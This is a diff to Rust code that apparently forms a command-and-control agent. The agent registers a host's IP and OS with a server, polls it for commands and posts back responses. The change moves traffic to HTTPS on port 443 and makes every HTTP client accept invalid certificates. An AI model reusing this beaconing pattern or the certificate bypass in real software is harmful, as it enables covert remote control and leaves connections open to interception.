@@ -14,7 +14,7 @@ use dirs;
 use pnet_datalink::interfaces;
 
 const sleep_time: Duration = time::Duration::from_millis(5000);
-const server_ip: &str = "http://127.0.0.1:8080";
+const server_ip: &str = "https://127.0.0.1:443";
 
 fn initHost(host_ip:&str) -> Option<String>{
     let ip = host_ip;
@@ -25,15 +25,20 @@ fn initHost(host_ip:&str) -> Option<String>{
         os = "Linux";
     }
     let text = format!("{{\"IP\": \"{}\", \"OS\": \"{}\"}}",ip,os);
-    let client = reqwest::blocking::Client::new();
+    // let client = reqwest::blocking::Client::new();
+    let client = reqwest::blocking::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .unwrap();
     let url = format!("{}/hosts/newHost",server_ip);
     let hostname = match client.post(url).json(&text).send(){
         Ok(ok)=>{
             let id = ok.text().unwrap().to_string(); 
             print(&id);
             Some(id)
-        }, Err(_)=>{
+        }, Err(e)=>{
             print(&"InitHost - Can't connect to server");
+            print(&format!("{}", e));
             None
         }
     };
@@ -61,7 +66,10 @@ fn get_local_ip() -> String {
 
 fn getCommands(identifier:&str){
     let commands_url = format!("{}/hosts/{}/commands",server_ip,identifier);
-	let client = Client::new();
+	let client = reqwest::blocking::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .unwrap();
 	let res = match client.get(commands_url).send(){
         Ok(ok)=>{
             ok.text().unwrap()
@@ -166,7 +174,10 @@ fn post_response(cmd_id: &str, response: &str, identifier: &str){
     let responses_url = format!("{}/hosts/{}/response",server_ip, identifier);
     print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
     let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
-    let client = reqwest::blocking::Client::new();
+    let client = reqwest::blocking::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .unwrap();
     let res = match client.post(&responses_url).json(&text).send(){
         Ok(ok)=>{
             ok.text().unwrap()
